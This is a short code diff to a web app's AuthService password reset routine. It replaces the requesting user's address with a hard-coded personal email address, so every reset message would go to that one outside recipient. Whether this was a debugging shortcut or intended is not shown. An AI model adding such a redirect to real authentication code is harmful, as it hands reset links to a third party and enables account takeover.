@@ -267,7 +267,7 @@ export class AuthService {
 
 		const mailOptions = {
 			from: '"Support" <transcendence502@gmail.com>',
-			to: email,
+			to: 'robelkedida@yahoo.de',
 			subject: 'Password Reset',
 			text: `Hello,
 
